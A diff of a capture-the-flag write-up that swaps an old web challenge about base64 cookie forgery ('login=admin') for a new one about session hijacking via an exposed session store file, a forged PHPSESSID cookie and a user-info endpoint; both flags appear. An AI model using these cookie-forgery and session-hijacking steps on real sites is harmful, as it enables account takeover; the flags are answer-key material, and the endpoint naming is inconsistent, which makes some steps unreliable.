@@ -4,37 +4,50 @@
 # Challenge Description
 Flag is restricted to logged users only , can you be one of them.
 
-Link: [http://34.76.107.218/whoami/](http://34.76.107.218/whoami/)
+Link: [http://34.77.37.110/restricted-sessions/](http://34.77.37.110/restricted-sessions/)
 
 ## Answer
-* Open inspect from (ctrl + shift + c) then scroll down ther is an account details
+* Open inspect from (ctrl + shift + c) then scroll down there is a script compare session id with phpsessid
 ```
-			Guest Account:
-			-=-=-=-=-=-=-=-
-			Username:Guest
-		    Password:Guest  
+<script type="text/javascript">
+
+      if(document.cookie !== ''){
+        $.post('getcurrentuserinfo.php',{
+          'PHPSESSID':document.cookie.match(/PHPSESSID=([^;]+)/)[1]
+        },function(data){
+          cu = data;
+        });
+      }
+</script>
 ```
-* Use above data to Login 
-* Using Burbsuit or cookie-editor to see cookies
+* Open Burb Suite to intercept requests (there isn't cookie on it)
+* Send request to repeater, then add some cookie
 ```
-Authentication=bG9naW49R3Vlc3Q%3D
+Cookie: PHPSESSID=test
 ```
-* From URL encode "%3d" implies "=" so current cookies equal "bG9naW49R3Vlc3Q=" (Base64 decode)
-* Decode base64 using linux command
-```bash
-echo 'bG9naW49R3Vlc3Q=' | base64 -d
-login=Guest
+Response:
 ```
-* Now we want to change 'Guest' to 'admin' then encode it
-```bash
-echo 'login=admin' | base64
-bG9naW49YWRtaW4K
+Session not found in data/session_store.txt
 ```
-* If you try it using Guest instead of admin you will see that it ends in 'k' but in cookies he remove it then appeand '=' (in URL encode '%3d')
-* Change website cookies to what we have generate (bG9naW49YWRtaW4%3D)
-* Reload the page
-* You got the password!!
+* He store session ids in this file let's see it
+* Change 'test' in the previous request to an id from this file
+Response:
+```
+UserInfo Cookie don't have the username , Validation failed 
+```
+* Cookie must contain username but if we try random one it will not work
+* From JavaScript code it get user info by sending post request to 'getcurrentuseringo.php' (notice that it is get now so you must change method)
+```
+GET /restricted-sessions/getcurrentuseringo.php?PHPSESSID=iuqwhe23eh23kej2hd2u3h2k23 HTTP/1.1
+```
+```
+"name":"john",
+"email":"john@example.com",
+"session_id":"iuqwhe23eh23kej2hd2u3h2k23"
+```
+* Now add username to Cookie then send
+* You got the Flag!!
 
 
  ## The Flag
- > FLag{B@D_4uTh1Nt1C4Ti0n}  
+ > sessionareawesomebutifitsecure 
